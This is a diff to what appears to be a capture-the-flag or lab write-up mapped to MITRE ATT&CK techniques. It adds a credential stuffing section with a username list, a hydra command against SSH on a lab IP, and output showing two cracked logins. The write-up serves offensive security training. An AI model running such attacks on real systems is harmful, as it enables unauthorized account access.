@@ -13,7 +13,7 @@ Insert the box image here
 | Techniqe ID                 | Name                          | Tool(s) Used                |
 |-----------------------------|-------------------------------|-----------------------------|
 | [T1595](https://attack.mitre.org/techniques/T1595/)                       | Active Scanning               | NMAP                        |
-| [T1592](https://attack.mitre.org/techniques/T1592/)                       | Gather Victim Host Information | NMAP                       |
+| [T1592](https://attack.mitre.org/techniques/T1592/)                       | Gather Victim Host Information | ssh                       |
 | [T1591](https://attack.mitre.org/techniques/T1591/)                       | Gather Vicitm Org Information | ssh -v |
 | [T1589](https://attack.mitre.org/techniques/T1589/)                       | Gather Victim Identify Information | Breached Creds, Personnel Roster |
 
@@ -90,6 +90,50 @@ What we can do:
 | [T1078](https://attack.mitre.org/techniques/T1078/)    | Valid Accounts    |  Hydra, SSH  |
 | [T1110](https://attack.mitre.org/techniques/T1110/004/)   |  Credential Stuffing   |  Hydra   |
 | [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |
+
+### Crafting the Credential Stuffing Attack
+Make a users.txt list which reflects the naming convention found on the SSH Banner:  
+f_lastName  
+
+  
+```bash
+j_davis
+b_harris
+l_jackson
+c_thomas
+e_Anderson
+d_white
+a_garcia
+j_smith
+j_moore
+m_brown
+m_martin
+s_miller
+p_martinez
+d_wilson
+e_johnson
+r_taylor
+j_thompson
+```
+
+With our users.txt and the breached credentials list, we can initiate the Credential Stuffing attack.  
+```bash
+hydra -L users.txt -P breachedCreds.txt $ip ssh
+```
+
+  ```bash
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
+[DATA] attacking ssh://10.10.43.128:22/
+[22][ssh] host: 10.10.43.128   login: j_moore   password: Unplanned8@Chair
+[22][ssh] host: 10.10.43.128   login: m_brown   password: resetMeAfter1Use!*
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
+```
+
 
 ### Initial Foothold
 Executed a credential stuffing attack utilizing the identifed users, and breached passwords.
